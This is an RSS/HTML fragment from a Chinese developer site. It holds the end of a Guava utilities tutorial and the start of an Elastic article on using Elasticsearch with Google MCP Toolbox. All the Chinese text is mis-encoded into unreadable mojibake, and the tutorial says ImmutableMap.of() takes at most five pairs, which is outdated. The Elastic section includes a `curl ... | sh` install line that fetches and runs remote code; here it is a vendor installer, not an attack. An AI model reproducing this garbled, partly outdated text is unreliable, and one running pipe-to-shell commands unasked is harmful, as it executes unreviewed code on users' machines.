        <span class="hljs-comment">// "user:12345"</span>
    }

    <span class="hljs-comment">// ç”Ÿæˆè®¢å•ç¼“å­˜é”®</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateOrderKey</span><span class="hljs-params">(String userId, String orderId)</span> {
        <span class="hljs-keyword">return</span> KEY_JOINER.join(<span class="hljs-string">"order"</span>, userId, orderId);
        <span class="hljs-comment">// "order:user123:order456"</span>
    }

    <span class="hljs-comment">// ç”Ÿæˆå•†å“ç¼“å­˜é”®ï¼ˆå¸¦åˆ†ç±»ï¼‰</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateProductKey</span><span class="hljs-params">(String category, String productId)</span> {
        <span class="hljs-keyword">return</span> KEY_JOINER.join(<span class="hljs-string">"product"</span>, category, productId);
        <span class="hljs-comment">// "product:electronics:prod789"</span>
    }
}
</code></pre>
<h3 data-id="heading-29">å…«ã€æœ€ä½³å®è·µä¸æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-30">8.1 Splitterå’ŒJoinerå¤ç”¨</h4>
<p>Splitterå’ŒJoineræ˜¯ä¸å¯å˜çš„ï¼Œåº”è¯¥å£°æ˜ä¸ºé™æ€å¸¸é‡å¤ç”¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Constants</span> {
    <span class="hljs-comment">// æ¨èï¼šå£°æ˜ä¸ºé™æ€å¸¸é‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Splitter</span> <span class="hljs-variable">COMMA_SPLITTER</span> <span class="hljs-operator">=</span> Splitter.on(<span class="hljs-string">','</span>)
        .trimResults()
        .omitEmptyStrings();

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Joiner</span> <span class="hljs-variable">COMMA_JOINER</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">','</span>).skipNulls();

    <span class="hljs-comment">// ä¸æ¨èï¼šæ¯æ¬¡éƒ½åˆ›å»ºæ–°å®ä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badExample</span><span class="hljs-params">(String str)</span> {
        List&lt;String&gt; parts = Splitter.on(<span class="hljs-string">','</span>).splitToList(str);  <span class="hljs-comment">// æ¯æ¬¡åˆ›å»º</span>
    }
}
</code></pre>
<h4 data-id="heading-31">8.2 ImmutableMapçš„å¤§å°é™åˆ¶</h4>
<p>ImmutableMap.of()æœ€å¤šæ”¯æŒ5ä¸ªé”®å€¼å¯¹ï¼Œè¶…è¿‡éœ€è¦ä½¿ç”¨Builderï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ï¼šè¶…è¿‡5ä¸ªé”®å€¼å¯¹ä¼šç¼–è¯‘é”™è¯¯</span>
ImmutableMap&lt;String, Integer&gt; map = ImmutableMap.of(
    <span class="hljs-string">"A"</span>, <span class="hljs-number">1</span>, <span class="hljs-string">"B"</span>, <span class="hljs-number">2</span>, <span class="hljs-string">"C"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">"D"</span>, <span class="hljs-number">4</span>, <span class="hljs-string">"E"</span>, <span class="hljs-number">5</span>, <span class="hljs-string">"F"</span>, <span class="hljs-number">6</span>  <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯</span>
);

<span class="hljs-comment">// æ­£ç¡®ï¼šä½¿ç”¨Builder</span>
ImmutableMap&lt;String, Integer&gt; map = ImmutableMap.&lt;String, Integer&gt;builder()
    .put(<span class="hljs-string">"A"</span>, <span class="hljs-number">1</span>)
    .put(<span class="hljs-string">"B"</span>, <span class="hljs-number">2</span>)
    .put(<span class="hljs-string">"C"</span>, <span class="hljs-number">3</span>)
    .put(<span class="hljs-string">"D"</span>, <span class="hljs-number">4</span>)
    .put(<span class="hljs-string">"E"</span>, <span class="hljs-number">5</span>)
    .put(<span class="hljs-string">"F"</span>, <span class="hljs-number">6</span>)
    .build();
</code></pre>
<h4 data-id="heading-32">8.3 BiMapçš„å€¼å”¯ä¸€æ€§</h4>
<p>BiMapè¦æ±‚å€¼å¿…é¡»å”¯ä¸€ï¼Œé‡å¤ä¼šæŠ›å¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-java" lang="java">BiMap&lt;String, Integer&gt; map = HashBiMap.create();
map.put(<span class="hljs-string">"A"</span>, <span class="hljs-number">1</span>);
map.put(<span class="hljs-string">"B"</span>, <span class="hljs-number">1</span>);  <span class="hljs-comment">// æŠ›å‡ºIllegalArgumentException</span>

<span class="hljs-comment">// ä½¿ç”¨forcePutå¼ºåˆ¶æ›¿æ¢</span>
map.forcePut(<span class="hljs-string">"B"</span>, <span class="hljs-number">1</span>);  <span class="hljs-comment">// Aè¢«ç§»é™¤ï¼ŒBæ˜ å°„åˆ°1</span>
</code></pre>
<h4 data-id="heading-33">8.4 Lists.transform()çš„è§†å›¾ç‰¹æ€§</h4>
<p>transform()è¿”å›çš„æ˜¯è§†å›¾ï¼Œä¸æ˜¯æ–°åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; original = Lists.newArrayList(<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>);
List&lt;String&gt; transformed = Lists.transform(original, String::toUpperCase);

<span class="hljs-comment">// ä¿®æ”¹åŸåˆ—è¡¨ä¼šå½±å“è§†å›¾</span>
original.set(<span class="hljs-number">0</span>, <span class="hljs-string">"x"</span>);
System.out.println(transformed.get(<span class="hljs-number">0</span>));  <span class="hljs-comment">// "X"</span>

<span class="hljs-comment">// å¦‚æœéœ€è¦ç‹¬ç«‹çš„åˆ—è¡¨ï¼Œåº”è¯¥å¤åˆ¶</span>
List&lt;String&gt; independent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(transformed);
</code></pre>
<h3 data-id="heading-34">ä¹ã€æ€»ç»“</h3>
<p>Guavaå·¥å…·åº“ä¸ºJavaå¼€å‘æä¾›äº†å¼ºå¤§è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼š</p>
<p><strong>Mapå·¥å…·ï¼š</strong></p>
<ul>
<li>âœ… ImmutableMapï¼šçº¿ç¨‹å®‰å…¨çš„ä¸å¯å˜æ˜ å°„</li>
<li>âœ… BiMapï¼šåŒå‘æŸ¥æ‰¾çš„æ˜ å°„</li>
<li>âœ… Multimapï¼šä¸€é”®å¤šå€¼çš„ä¾¿æ·æ“ä½œ</li>
<li>âœ… Tableï¼šåŒé”®æ˜ å°„çš„å¼ºå¤§åŠŸèƒ½</li>
</ul>
<p><strong>Listå·¥å…·ï¼š</strong></p>
<ul>
<li>âœ… ImmutableListï¼šä¸å¯å˜åˆ—è¡¨</li>
<li>âœ… Lists.partition()ï¼šæ‰¹é‡å¤„ç†çš„åˆ©å™¨</li>
<li>âœ… Lists.transform()ï¼šå‡½æ•°å¼è½¬æ¢</li>
</ul>
<p><strong>Splitterï¼š</strong></p>
<ul>
<li>âœ… æ™ºèƒ½å¤„ç†ç©ºç™½å’Œnull</li>
<li>âœ… é“¾å¼APIï¼Œä»£ç æ›´ç®€æ´</li>
<li>âœ… MapSplitterè§£æé”®å€¼å¯¹</li>
</ul>
<p><strong>Joinerï¼š</strong></p>
<ul>
<li>âœ… ä¼˜é›…çš„å­—ç¬¦ä¸²è¿æ¥</li>
<li>âœ… çµæ´»çš„nullå¤„ç†</li>
<li>âœ… Mapå’Œé›†åˆçš„ç»Ÿä¸€è¿æ¥</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨ Google MCP Toolbox for Databases ä¸­å¼•å…¥ Elasticsearch æ”¯æŒ]]></title>    <link>https://juejin.cn/post/7583139562734567467</link>    <guid>https://juejin.cn/post/7583139562734567467</guid>    <pubDate>2025-12-13T01:29:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583139562734567467" data-draft-id="7583139562734551083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨ Google MCP Toolbox for Databases ä¸­å¼•å…¥ Elasticsearch æ”¯æŒ"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-13T01:29:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨ Google MCP Toolbox for Databases ä¸­å¼•å…¥ Elasticsearch æ”¯æŒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T01:29:19.000Z" title="Sat Dec 13 2025 01:29:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fenrico-zimuel" title="https://www.elastic.co/search-labs/author/enrico-zimuel" target="_blank" ref="nofollow noopener noreferrer">Enrico Zimuel</a>Â åŠÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Flaurent-saint-felix" title="https://www.elastic.co/search-labs/author/laurent-saint-felix" target="_blank" ref="nofollow noopener noreferrer">Laurent Saint-FÃ©lix</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e01c6927ec064114996a85a6aecc8f63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=PDK8Sb%2FSZcUhFnyNj4IY7iyGbzk%3D" alt="" loading="lazy"/></p>
<p>æ¢ç´¢ Elasticsearch æ”¯æŒç°å·²åœ¨ Google MCP Toolbox for Databases ä¸­å¯ç”¨ï¼Œå¹¶åˆ©ç”¨ ES|QL å·¥å…·å®‰å…¨åœ°å°†ä½ çš„ç´¢å¼•ä¸ä»»ä½• MCP å®¢æˆ·ç«¯é›†æˆã€‚</p>
<p>åŠ¨æ‰‹ä½“éªŒ Elasticsearchï¼šæ·±å…¥äº†è§£æˆ‘ä»¬çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch-labs%3Ftab%3Dreadme-ov-file" title="https://github.com/elastic/elasticsearch-labs?tab=readme-ov-file" target="_blank" ref="nofollow noopener noreferrer">ç¤ºä¾‹ notebooks</a>ï¼Œå¼€å§‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fcloud-trial-overview" title="https://www.elastic.co/cloud/cloud-trial-overview" target="_blank" ref="nofollow noopener noreferrer">å…è´¹çš„ cloud è¯•ç”¨</a>ï¼Œæˆ–ç«‹å³åœ¨ä½ çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143747798" title="https://elasticstack.blog.csdn.net/article/details/143747798" target="_blank" ref="nofollow noopener noreferrer">æœ¬åœ°æœºå™¨</a>ä¸Šè¯•ç”¨ Elasticã€‚</p>
<hr/>
<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•å°† Google MCP Toolbox ä¸ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch" title="https://github.com/elastic/elasticsearch" target="_blank" ref="nofollow noopener noreferrer">Elasticsearch</a> ä¸€èµ·ä½¿ç”¨ï¼Œæ„å»ºä¸€ä¸ªç”¨äºä» Elasticsearch ç´¢å¼•ä¸­æå–ä¿¡æ¯çš„ç®€å•å·¥å…·ã€‚</p>
<p>æˆ‘ä»¬æœ€è¿‘ä¸º <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogleapis%2Fgenai-toolbox" title="https://github.com/googleapis/genai-toolbox" target="_blank" ref="nofollow noopener noreferrer">Google MCP Toolbox for Databases</a> å¼€æºé¡¹ç›®åšå‡ºäº†è´¡çŒ®ï¼Œæ–°å¢äº†å¯¹ Elasticsearch ä½œä¸ºæ•°æ®åº“çš„æ”¯æŒã€‚</p>
<p>æœ‰äº†è¿™ä¸ªæ–°åŠŸèƒ½ï¼Œä½ ç°åœ¨å¯ä»¥ä½¿ç”¨ Google MCP Toolbox è¿æ¥åˆ° Elasticsearchï¼Œå¹¶ç›´æ¥ä¸ä½ çš„æ•°æ®è¿›è¡Œ â€œå¯¹è¯â€ã€‚</p>
<h2 data-id="heading-0">Elasticsearch</h2>
<p>æˆ‘ä»¬éœ€è¦è¿è¡Œä¸€ä¸ª Elasticsearch å®ä¾‹ã€‚ä½ å¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud" title="https://www.elastic.co/cloud" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud</a> ä¸Šæ¿€æ´»ä¸€ä¸ªå…è´¹è¯•ç”¨ï¼Œæˆ–è€…ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143747798" title="https://elasticstack.blog.csdn.net/article/details/143747798" target="_blank" ref="nofollow noopener noreferrer">start-local</a> è„šæœ¬åœ¨æœ¬åœ°å®‰è£…ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`curl <span class="hljs-operator">-</span>fsSL https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>elastic.co<span class="hljs-operator">/</span><span class="hljs-keyword">start</span><span class="hljs-operator">-</span><span class="hljs-keyword">local</span> <span class="hljs-operator">|</span> sh`AIå†™ä»£ç 
</code></pre>
<p>è¿™å°†ä¼šåœ¨ä½ çš„ç”µè„‘ä¸Šå®‰è£… Elasticsearch å’Œ Kibanaï¼Œå¹¶ç”Ÿæˆä¸€ä¸ª API keyï¼Œç”¨äºé…ç½® Google MCP Toolboxã€‚</p>
<p>API key å°†ä½œä¸ºå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºæ˜¾ç¤ºï¼Œå¹¶å­˜å‚¨åœ¨ elastic-start-local æ–‡ä»¶å¤¹ä¸­çš„ .env æ–‡ä»¶é‡Œã€‚</p>
<h2 data-id="heading-1">å®‰è£…ç¤ºä¾‹æ•°æ®é›†</h2>
<p>å®‰è£…å®Œæˆåï¼Œä½ å¯ä»¥ä½¿ç”¨ç”¨æˆ·å elastic å’Œç”± start-local è„šæœ¬ç”Ÿæˆçš„å¯†ç ç™»å½• Kibanaï¼ˆå­˜å‚¨åœ¨ .env æ–‡ä»¶ä¸­ï¼‰ã€‚</p>
<p>ä½ å¯ä»¥å®‰è£… Kibana ä¸­æä¾›çš„ <strong>eCommerce orders</strong> ç¤ºä¾‹æ•°æ®é›†ã€‚å®ƒåŒ…å«ä¸€ä¸ªåä¸º <strong>kibana_sample_data_ecommerce</strong> çš„ç´¢å¼•ï¼Œå…¶ä¸­åŒ…å«æ¥è‡ªä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fenterprise-search%2Fecommerce" title="https://www.elastic.co/enterprise-search/ecommerce" target="_blank" ref="nofollow noopener noreferrer">ç”µå•†</a>ç½‘ç«™çš„ 4,675 ä¸ªè®¢å•çš„ä¿¡æ¯ã€‚å¯¹äºæ¯ä¸ªè®¢å•ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>å®¢æˆ·ä¿¡æ¯ï¼ˆå§“åã€IDã€å‡ºç”Ÿæ—¥æœŸã€é‚®ç®±ç­‰ï¼‰</li>
<li>è®¢å•æ—¥æœŸ</li>
<li>è®¢å• ID</li>
<li>äº§å“ï¼ˆæ‰€æœ‰äº§å“çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä»·æ ¼ã€æ•°é‡ã€IDã€ç±»åˆ«ã€æŠ˜æ‰£ç­‰ï¼‰</li>
<li>SKU</li>
<li>æ€»ä»·ï¼ˆæœªå«ç¨ã€å«ç¨ï¼‰</li>
<li>æ€»æ•°é‡</li>
<li>åœ°ç†ä¿¡æ¯ï¼ˆåŸå¸‚ã€å›½å®¶ã€å¤§æ´²ã€ä½ç½®ã€åœ°åŒºï¼‰</li>
</ul>
<p>è¦å®‰è£…ç¤ºä¾‹æ•°æ®ï¼Œè¯·åœ¨ Kibana ä¸­æ‰“å¼€ <strong>Integrations</strong> é¡µé¢ï¼ˆåœ¨é¡¶éƒ¨æœç´¢æ ä¸­æœç´¢ â€œIntegrationâ€ï¼‰ï¼Œå¹¶å®‰è£… â€œSample Dataâ€ã€‚æ›´å¤šç»†èŠ‚è¯·å‚è€ƒè¿™é‡Œçš„æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2F%23gs-get-data-into-kibana%25E3%2580%2582" title="https://www.elastic.co/docs/explore-analyze/#gs-get-data-into-kibana%E3%80%82" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/docs/explorâ€¦</a></p>
<p>æœ¬æ–‡çš„ç›®æ ‡æ˜¯å±•ç¤ºé…ç½® Google MCP Toolbox è¿æ¥åˆ° Elasticsearchï¼Œå¹¶ä½¿ç”¨è‡ªç„¶è¯­è¨€ä¸ <strong>kibana_sample_data_ecommerce</strong> ç´¢å¼•äº¤äº’æ˜¯å¤šä¹ˆç®€å•ã€‚</p>
<h2 data-id="heading-2">Google MCP Toolbox</h2>
<p>Google MCP Toolbox æ˜¯ä¸€ä¸ªå¼€æºçš„ MCP serverï¼Œæ—¨åœ¨è®©åº”ç”¨å’Œ AI agents èƒ½å¤Ÿå®‰å…¨ã€é«˜æ•ˆåœ°ä¸ databases äº¤äº’ã€‚è¯¥é¡¹ç›®ä¹‹å‰åä¸º â€œGenAI Toolbox for Databasesâ€ï¼Œåœ¨é‡‡ç”¨äº†å¯¹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol" title="https://www.anthropic.com/news/model-context-protocol" target="_blank" ref="nofollow noopener noreferrer">Model Context Protocolï¼ˆMCPï¼‰</a>çš„å®Œå…¨å…¼å®¹ä¹‹åè¿›è¡Œäº†é‡å‘½åã€‚å®ƒçš„ç›®æ ‡æ˜¯æ¶ˆé™¤ agents è¿æ¥ databases æ—¶ä¼ ç»Ÿä¸Šæ‰€éœ€çš„ç¹é‡å·¥ä½œï¼Œé€šè¿‡åœ¨åå°å¤„ç† connection poolingã€authenticationã€observability ä»¥åŠå…¶ä»–è¿ç»´ç›¸å…³é—®é¢˜ã€‚</p>
<p>ä»æ ¸å¿ƒæ¥çœ‹ï¼ŒToolbox å…è®¸å¼€å‘è€…å®šä¹‰å¯å¤ç”¨çš„é«˜å±‚ toolsï¼Œç”¨äºå°è£… database äº¤äº’ã€‚è¿™äº› tools éšåå¯ä»¥è¢«ä»»ä½•å…¼å®¹ MCP çš„ clientï¼ˆä¾‹å¦‚ AI agentï¼‰è°ƒç”¨ï¼Œè€Œæ— éœ€ client å®ç°åº•å±‚çš„ SQL queries æˆ–ç®¡ç† database connectionsã€‚è¿™ç§æ–¹å¼å¤§å¹…å‡å°‘äº†æ„å»ºå…·å¤‡ database èƒ½åŠ›çš„ agents æ‰€éœ€çš„æ ·æ¿ä»£ç ï¼Œä½¿å¾—åªéœ€å‡ è¡Œåº”ç”¨é€»è¾‘å°±èƒ½é›†æˆé«˜çº§çš„æ•°æ®æ“ä½œã€‚ä¸€æ—¦å®šä¹‰äº†ä¸€ä¸ª toolï¼Œå®ƒå°±å¯ä»¥åœ¨å¤šä¸ª agentsã€frameworks æˆ– languages ä¹‹é—´å…±äº«ï¼ˆFigure 1ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9779b900c344d15a007ba0354141d19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766194159&amp;x-signature=4iDMFzW%2B9h6g7SDk3SwcFswrlKw%3D" alt="" loading="lazy"/> å›¾ 1ï¼šGoogle MCP Toolbox çš„æ•´ä½“æ¶æ„</p>
<h2 data-id="heading-3">å¦‚ä½•å®‰è£… MCP Toolbox</h2>
<p>ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ Linux ä¸Šå®‰è£… MCP Toolbox serverï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  <span class="hljs-built_in">export</span> VERSION=0.21.0
2.  curl -L -o toolbox https://storage.googleapis.com/genai-toolbox/v<span class="hljs-variable">$VERSION</span>/linux/amd64/toolbox
3.  <span class="hljs-built_in">chmod</span> +x toolbox

`AIå†™ä»£ç 
</code></pre>
<p>å¦‚æœä½ æƒ³åœ¨ macOS æˆ– Windows ä¸Šå®‰è£…ï¼Œå¯ä»¥æŒ‰ç…§è¿™é‡Œè¯¦ç»†è¯´æ˜çš„è¯´æ˜è¿›è¡Œæ“ä½œã€‚</p>
<h2 data-id="heading-4">ä¸º Elasticsearch é…ç½® Toolbox</h2>
<p>è¦ä¸º Elasticsearch é…ç½® MCP Toolboxï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª tools.yaml æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">`</span>

<span class="hljs-attr">1.  sources:</span>
<span class="hljs-attr">2.    my-cluster:</span>
<span class="hljs-attr">3.      kind:</span> <span class="hljs-string">elasticsearch</span>
<span class="hljs-attr">4.      addresses:</span>
<span class="hljs-number">5</span><span class="hljs-string">.</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">http://localhost:9200</span>
<span class="hljs-attr">6.      apikey:</span> <span class="hljs-string">&lt;insert-here-api-key&gt;</span>

<span class="hljs-attr">8.  tools:</span>
<span class="hljs-attr">9.    customer-orders:</span>
<span class="hljs-attr">10.      kind:</span> <span class="hljs-string">elasticsearch-esql</span>
<span class="hljs-attr">11.      source:</span> <span class="hljs-string">my-cluster</span>
<span class="hljs-attr">12.      description:</span> <span class="hljs-string">Get</span> <span class="hljs-string">the</span> <span class="hljs-string">orders</span> <span class="hljs-string">made</span> <span class="hljs-string">by</span> <span class="hljs-string">a</span> <span class="hljs-string">customer</span> <span class="hljs-string">identified</span> <span class="hljs-string">by</span> <span class="hljs-string">name.</span>
<span class="hljs-attr">13.      query:</span> <span class="hljs-string">|</span>
<span class="hljs-number">14</span><span class="hljs-string">.</span>      	<span class="hljs-string">FROM</span> <span class="hljs-string">kibana_sample_data_ecommerce</span> <span class="hljs-string">|</span> <span class="hljs-string">WHERE</span> <span class="hljs-string">MATCH(customer_full_name,</span> <span class="hljs-string">?name,</span> {<span class="hljs-attr">"operator":</span> <span class="hljs-string">"AND"</span>}<span class="hljs-string">)</span>
<span class="hljs-attr">15.      parameters:</span>
